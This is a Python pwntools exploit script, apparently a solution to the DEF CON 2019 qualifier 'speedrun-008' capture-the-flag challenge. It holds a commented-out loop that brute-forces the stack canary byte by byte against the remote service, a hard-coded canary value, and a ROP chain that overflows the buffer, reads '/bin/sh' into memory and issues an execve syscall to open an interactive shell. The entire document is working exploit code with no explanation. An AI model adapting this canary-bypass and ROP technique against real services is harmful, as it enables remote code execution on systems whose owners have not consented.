from pwn import *
from time import sleep

context.arch = 'amd64'
context.log_level = 'debug'
r = remote('speedrun-008.quals2019.oooverflow.io', 31337)

bss = 0x6bc200
read = 0x449900
#0x0000000000400686 : pop rdi ; ret
gg1 = 0x400686
#0x000000000044be99 : pop rdx ; pop rsi ; ret
gg2 = 0x44be99
#0x00000000004156c4 : pop rax ; ret
gg3 = 0x4156c4
#0x0000000000474ec5 : syscall ; ret
gg4 = 0x0000000000474ec5

# leak fixed cananry
found = '\x00\xc9\x50\x20\x31\x4a\x5c\x1e'
'''
while len(found) != 8:
    for i in range(0,256):
        r = process('./speedrun-008')
        r = remote('speedrun-008.quals2019.oooverflow.io', 31337)
        
        find = chr(i)
        p = 'a' * 0x408 + found + find
        r.recvuntil('Yes?\n')
        r.send(p)
        r.recvuntil('\n')
       
        try:
            if 'Peace' in r.recvuntil('\n'):
                found += find
                break
            else:
                pass
        except:
            pass
'''

# syscall with leaked canary
canary = u64(found)
p = 'a' * 0x408 + p64(canary) + 'a'*8
p += flat(
        gg1,
        0,
        gg2,
        8,
        bss,
        read
)
p += flat(
        gg1,
        bss,
        gg2,
        0,
        0,
        gg3,
        59,
        gg4
)
r.recvuntil('Yes?\n')
r.send(p)
r.recvuntil('\n')
sleep(0.5)
r.send('/bin/sh\x00')
r.interactive()
